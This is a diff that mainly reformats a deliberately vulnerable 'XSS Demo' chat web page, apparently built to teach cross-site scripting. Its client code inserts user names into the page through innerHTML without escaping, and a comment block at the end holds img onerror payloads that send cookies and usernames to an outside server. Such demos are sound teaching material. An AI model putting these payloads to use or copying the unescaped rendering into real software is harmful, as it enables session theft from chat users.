@@ -7,7 +7,10 @@
     <title>Live Chat App (XSS Demo)</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap"
+      rel="stylesheet"
+    />
     <link rel="stylesheet" href="styles.css" />
     <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
   </head>
@@ -100,7 +103,9 @@
         <aside class="sidebar" id="sidebar">
           <div class="sidebar-header">
             <h2 class="sidebar-title">Chats</h2>
-            <button class="new-group-btn" id="new-group-btn" title="New Group">+</button>
+            <button class="new-group-btn" id="new-group-btn" title="New Group">
+              +
+            </button>
           </div>
           <div class="sidebar-list" id="sidebar-list">
             <!-- Populated by JS -->
@@ -111,7 +116,13 @@
         <div class="chat-area">
           <div class="top-bar">
             <button class="hamburger-btn" id="hamburger-btn">☰</button>
-            <h1 id="chat-title" class="chat-title-clickable" title="View details">Community</h1>
+            <h1
+              id="chat-title"
+              class="chat-title-clickable"
+              title="View details"
+            >
+              Community
+            </h1>
             <div class="top-bar-right">
               <button class="logout-btn" id="logout-btn">Logout</button>
               <div class="logged-in-user" id="logged-in-user"></div>
@@ -121,23 +132,60 @@
           <div id="messages"></div>
 
           <form id="chat-form">
-            <div class="image-preview-bar" id="image-preview-bar" style="display:none">
+            <div
+              class="image-preview-bar"
+              id="image-preview-bar"
+              style="display: none"
+            >
               <img id="image-preview-img" src="" alt="Preview" />
-              <button type="button" class="image-preview-remove" id="image-preview-remove" title="Remove">✕</button>
+              <button
+                type="button"
+                class="image-preview-remove"
+                id="image-preview-remove"
+                title="Remove"
+              >
+                ✕
+              </button>
             </div>
             <div class="send-message-wrapper">
-              <button type="button" class="emoji-toggle-btn" id="emoji-toggle-btn" title="Emoji">😊</button>
-              <div class="emoji-picker" id="emoji-picker" style="display:none">
+              <button
+                type="button"
+                class="emoji-toggle-btn"
+                id="emoji-toggle-btn"
+                title="Emoji"
+              >
+                😊
+              </button>
+              <div class="emoji-picker" id="emoji-picker" style="display: none">
                 <div class="emoji-grid" id="emoji-grid"></div>
               </div>
-              <button type="button" class="attach-btn" id="attach-btn" title="Attach image">📎</button>
-              <input type="file" id="image-input" accept="image/jpeg,image/png,image/gif,image/webp" style="display:none" />
+              <button
+                type="button"
+                class="attach-btn"
+                id="attach-btn"
+                title="Attach image"
+              >
+                📎
+              </button>
+              <input
+                type="file"
+                id="image-input"
+                accept="image/jpeg,image/png,image/gif,image/webp"
+                style="display: none"
+              />
               <textarea
                 id="message"
                 placeholder="Type your message"
                 rows="1"
               ></textarea>
-              <button type="submit" class="submit-btn" title="Send"><svg viewBox="0 0 24 24" width="24" height="24" fill="none"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z" fill="currentColor"/></svg></button>
+              <button type="submit" class="submit-btn" title="Send">
+                <svg viewBox="0 0 24 24" width="24" height="24" fill="none">
+                  <path
+                    d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"
+                    fill="currentColor"
+                  />
+                </svg>
+              </button>
             </div>
           </form>
         </div>
@@ -147,28 +195,47 @@
       <div class="sidebar-backdrop" id="sidebar-backdrop"></div>
 
       <!-- Group creation modal -->
-      <div class="modal-backdrop" id="modal-backdrop" style="display:none">
+      <div class="modal-backdrop" id="modal-backdrop" style="display: none">
         <div class="modal">
           <h3>Create Group</h3>
-          <input type="text" id="group-name-input" placeholder="Group name" class="input-username" />
+          <input
+            type="text"
+            id="group-name-input"
+            placeholder="Group name"
+            class="input-username"
+          />
           <div class="modal-members-label">Select members:</div>
           <div class="modal-members-list" id="modal-members-list"></div>
           <div class="login-error" id="group-error"></div>
           <div class="modal-actions">
-            <button type="button" class="modal-cancel-btn" id="modal-cancel">Cancel</button>
-            <button type="button" class="modal-create-btn" id="modal-create">Create</button>
+            <button type="button" class="modal-cancel-btn" id="modal-cancel">
+              Cancel
+            </button>
+            <button type="button" class="modal-create-btn" id="modal-create">
+              Create
+            </button>
           </div>
         </div>
       </div>
 
       <!-- Conversation info modal -->
-      <div class="modal-backdrop" id="info-modal-backdrop" style="display:none">
+      <div
+        class="modal-backdrop"
+        id="info-modal-backdrop"
+        style="display: none"
+      >
         <div class="modal">
           <h3 id="info-modal-title">Details</h3>
           <div class="modal-members-label">Members:</div>
           <div class="modal-members-list" id="info-modal-members"></div>
           <div class="modal-actions">
-            <button type="button" class="modal-cancel-btn" id="info-modal-close">Close</button>
+            <button
+              type="button"
+              class="modal-cancel-btn"
+              id="info-modal-close"
+            >
+              Close
+            </button>
           </div>
         </div>
       </div>
@@ -185,9 +252,16 @@
         const d = new Date(ts.endsWith("Z") ? ts : ts + "Z");
         const now = new Date();
         const isToday = d.toDateString() === now.toDateString();
-        const time = d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
+        const time = d.toLocaleTimeString([], {
+          hour: "2-digit",
+          minute: "2-digit",
+        });
         if (isToday) return time;
-        return d.toLocaleDateString([], { month: "short", day: "numeric" }) + ", " + time;
+        return (
+          d.toLocaleDateString([], { month: "short", day: "numeric" }) +
+          ", " +
+          time
+        );
       }
 
       function renderMessage(msg, container) {
@@ -211,7 +285,8 @@
       }
 
       function showEmptyState(container) {
-        container.innerHTML = '<div class="empty-chat-state"><div class="empty-chat-icon">💬</div><div class="empty-chat-text">No messages yet</div><div class="empty-chat-subtext">Say hello to start the conversation!</div></div>';
+        container.innerHTML =
+          '<div class="empty-chat-state"><div class="empty-chat-icon">💬</div><div class="empty-chat-text">No messages yet</div><div class="empty-chat-subtext">Say hello to start the conversation!</div></div>';
       }
 
       function showStep(step) {
@@ -256,7 +331,7 @@
         const remainingUsers = users.filter(
           (u) =>
             u.username !== window.username &&
-            !usersInPrivateChats.has(u.username)
+            !usersInPrivateChats.has(u.username),
         );
 
         function createConvItem(conv) {
@@ -352,8 +427,9 @@
         window.socket.emit("load messages", convId);
 
         // Mark conversation as read
-        fetch("/api/conversations/" + convId + "/read", { method: "POST" })
-          .then(() => refreshSidebar());
+        fetch("/api/conversations/" + convId + "/read", {
+          method: "POST",
+        }).then(() => refreshSidebar());
       }
 
       // Start a private chat with a user
@@ -388,7 +464,9 @@
           if (data.messages.length === 0) {
             showEmptyState(messagesContainer);
           } else {
-            data.messages.forEach((msg) => renderMessage(msg, messagesContainer));
+            data.messages.forEach((msg) =>
+              renderMessage(msg, messagesContainer),
+            );
           }
           messagesContainer.scrollTop = messagesContainer.scrollHeight;
         });
@@ -399,11 +477,14 @@
           if (msg.conversationId !== window.currentConversationId) return;
 
           // Mark as read since we're viewing this conversation
-          fetch("/api/conversations/" + msg.conversationId + "/read", { method: "POST" });
+          fetch("/api/conversations/" + msg.conversationId + "/read", {
+            method: "POST",
+          });
 
           const messagesContainer = document.getElementById("messages");
           // Clear empty state if present
-          const emptyState = messagesContainer.querySelector(".empty-chat-state");
+          const emptyState =
+            messagesContainer.querySelector(".empty-chat-state");
           if (emptyState) emptyState.remove();
 
           renderMessage(msg, messagesContainer);
@@ -437,7 +518,8 @@
                 .catch((err) => console.error("Upload failed:", err));
               // Clear image preview
               imageInput.value = "";
-              document.getElementById("image-preview-bar").style.display = "none";
+              document.getElementById("image-preview-bar").style.display =
+                "none";
             } else if (message.trim()) {
               socket.emit("new message", {
                 username,
@@ -449,28 +531,36 @@
           });
 
         // Attachment button
-        document.getElementById("attach-btn").addEventListener("click", function () {
-          document.getElementById("image-input").click();
-        });
-        document.getElementById("image-input").addEventListener("change", function () {
-          const file = this.files[0];
-          if (!file) return;
-          if (file.size > 5 * 1024 * 1024) {
-            alert("Image too large. Maximum size is 5MB.");
-            this.value = "";
-            return;
-          }
-          const reader = new FileReader();
-          reader.onload = function (ev) {
-            document.getElementById("image-preview-img").src = ev.target.result;
-            document.getElementById("image-preview-bar").style.display = "flex";
-          };
-          reader.readAsDataURL(file);
-        });
-        document.getElementById("image-preview-remove").addEventListener("click", function () {
-          document.getElementById("image-input").value = "";
-          document.getElementById("image-preview-bar").style.display = "none";
-        });
+        document
+          .getElementById("attach-btn")
+          .addEventListener("click", function () {
+            document.getElementById("image-input").click();
+          });
+        document
+          .getElementById("image-input")
+          .addEventListener("change", function () {
+            const file = this.files[0];
+            if (!file) return;
+            if (file.size > 5 * 1024 * 1024) {
+              alert("Image too large. Maximum size is 5MB.");
+              this.value = "";
+              return;
+            }
+            const reader = new FileReader();
+            reader.onload = function (ev) {
+              document.getElementById("image-preview-img").src =
+                ev.target.result;
+              document.getElementById("image-preview-bar").style.display =
+                "flex";
+            };
+            reader.readAsDataURL(file);
+          });
+        document
+          .getElementById("image-preview-remove")
+          .addEventListener("click", function () {
+            document.getElementById("image-input").value = "";
+            document.getElementById("image-preview-bar").style.display = "none";
+          });
       }
 
       function enterChat(username) {
@@ -594,7 +684,9 @@
         fetch("/api/conversations/" + convId + "/members")
           .then((r) => r.json())
           .then((data) => {
-            const title = data.conversation.name || document.getElementById("chat-title").textContent;
+            const title =
+              data.conversation.name ||
+              document.getElementById("chat-title").textContent;
             document.getElementById("info-modal-title").textContent = title;
             const list = document.getElementById("info-modal-members");
             list.innerHTML = "";
@@ -605,34 +697,35 @@
               item.innerHTML = `<div class="sidebar-avatar" style="width:32px;height:32px;min-width:32px;font-size:14px;">${(m.name || m.username)[0]}</div> <span>${m.name || m.username}${isYou ? " (You)" : ""}</span>`;
               list.appendChild(item);
             });
-            document.getElementById("info-modal-backdrop").style.display = "flex";
+            document.getElementById("info-modal-backdrop").style.display =
+              "flex";
           });
       });
 
-      document.getElementById("info-modal-close").addEventListener("click", () => {
-        document.getElementById("info-modal-backdrop").style.display = "none";
-      });
+      document
+        .getElementById("info-modal-close")
+        .addEventListener("click", () => {
+          document.getElementById("info-modal-backdrop").style.display = "none";
+        });
 
       // Group creation modal
-      document
-        .getElementById("new-group-btn")
-        .addEventListener("click", () => {
-          const membersList = document.getElementById("modal-members-list");
-          membersList.innerHTML = "";
-          document.getElementById("group-name-input").value = "";
-          document.getElementById("group-error").textContent = "";
+      document.getElementById("new-group-btn").addEventListener("click", () => {
+        const membersList = document.getElementById("modal-members-list");
+        membersList.innerHTML = "";
+        document.getElementById("group-name-input").value = "";
+        document.getElementById("group-error").textContent = "";
 
-          window.allUsers
-            .filter((u) => u.username !== window.username)
-            .forEach((u) => {
-              const label = document.createElement("label");
-              label.classList.add("modal-member-item");
-              label.innerHTML = `<input type="checkbox" value="${u.username}" /> <span>${u.name || u.username}</span>`;
-              membersList.appendChild(label);
-            });
+        window.allUsers
+          .filter((u) => u.username !== window.username)
+          .forEach((u) => {
+            const label = document.createElement("label");
+            label.classList.add("modal-member-item");
+            label.innerHTML = `<input type="checkbox" value="${u.username}" /> <span>${u.name || u.username}</span>`;
+            membersList.appendChild(label);
+          });
 
-          document.getElementById("modal-backdrop").style.display = "flex";
-        });
+        document.getElementById("modal-backdrop").style.display = "flex";
+      });
 
       document.getElementById("modal-cancel").addEventListener("click", () => {
         document.getElementById("modal-backdrop").style.display = "none";
@@ -644,7 +737,7 @@
         errorEl.textContent = "";
 
         const checked = document.querySelectorAll(
-          "#modal-members-list input:checked"
+          "#modal-members-list input:checked",
         );
         const members = Array.from(checked).map((cb) => cb.value);
 
@@ -674,15 +767,52 @@
       });
 
       // Enter to send, Shift+Enter for new line
-      document.getElementById("message").addEventListener("keydown", function (e) {
-        if (e.key === "Enter" && !e.shiftKey) {
-          e.preventDefault();
-          document.getElementById("chat-form").dispatchEvent(new Event("submit"));
-        }
-      });
+      document
+        .getElementById("message")
+        .addEventListener("keydown", function (e) {
+          if (e.key === "Enter" && !e.shiftKey) {
+            e.preventDefault();
+            document
+              .getElementById("chat-form")
+              .dispatchEvent(new Event("submit"));
+          }
+        });
 
       // Emoji picker
-      const emojis = ["😊","😂","❤️","🔥","👍","😭","🎉","💀","👀","🤔","😎","🙏","💯","✨","😈","🤡","💚","🫡","👏","😤","🥳","😱","💀","🤖","👾","🐛","⚡","🔒","🛡️","💻","🧑‍💻","🪲"];
+      const emojis = [
+        "😊",
+        "😂",
+        "❤️",
+        "🔥",
+        "👍",
+        "😭",
+        "🎉",
+        "💀",
+        "👀",
+        "🤔",
+        "😎",
+        "🙏",
+        "💯",
+        "✨",
+        "😈",
+        "🤡",
+        "💚",
+        "🫡",
+        "👏",
+        "😤",
+        "🥳",
+        "😱",
+        "💀",
+        "🤖",
+        "👾",
+        "🐛",
+        "⚡",
+        "🔒",
+        "🛡️",
+        "💻",
+        "🧑‍💻",
+        "🪲",
+      ];
       const emojiGrid = document.getElementById("emoji-grid");
       emojis.forEach((emoji) => {
         const btn = document.createElement("span");
@@ -692,22 +822,30 @@
           const ta = document.getElementById("message");
           const start = ta.selectionStart;
           const end = ta.selectionEnd;
-          ta.value = ta.value.substring(0, start) + emoji + ta.value.substring(end);
+          ta.value =
+            ta.value.substring(0, start) + emoji + ta.value.substring(end);
           ta.selectionStart = ta.selectionEnd = start + emoji.length;
           ta.focus();
         });
         emojiGrid.appendChild(btn);
       });
 
-      document.getElementById("emoji-toggle-btn").addEventListener("click", (e) => {
-        e.stopPropagation();
-        const picker = document.getElementById("emoji-picker");
-        picker.style.display = picker.style.display === "none" ? "block" : "none";
-      });
+      document
+        .getElementById("emoji-toggle-btn")
+        .addEventListener("click", (e) => {
+          e.stopPropagation();
+          const picker = document.getElementById("emoji-picker");
+          picker.style.display =
+            picker.style.display === "none" ? "block" : "none";
+        });
 
       document.addEventListener("click", (e) => {
         const picker = document.getElementById("emoji-picker");
-        if (picker && !picker.contains(e.target) && e.target.id !== "emoji-toggle-btn") {
+        if (
+          picker &&
+          !picker.contains(e.target) &&
+          e.target.id !== "emoji-toggle-btn"
+        ) {
           picker.style.display = "none";
         }
       });
@@ -728,10 +866,4 @@
 
 <!-- XSS Demo payloads -->
 <!-- Steal cookie only: -->
-<!-- <img src=x onerror="fetch('https://simple-express-app-2i93.onrender.com/api/save?data='+document.cookie)"> -->
-
-<!-- Steal cookie + username: -->
-<!-- <img src=x onerror="fetch('https://simple-express-app-2i93.onrender.com/api/save?data='+document.cookie+'&user='+sessionStorage.getItem('username'))"> -->
-
-<!-- <img src=x onerror="fetch('https://simple-express-app-2i93.onrender.com/api/save?data='+document.cookie+'&user='+sessionStorage.getItem('username'))"> -->
 <!-- <img src=x onerror="fetch('https://simple-express-app-2i93.onrender.com/api/save?data='+document.cookie+' user='+sessionStorage.getItem('username'))"> -->
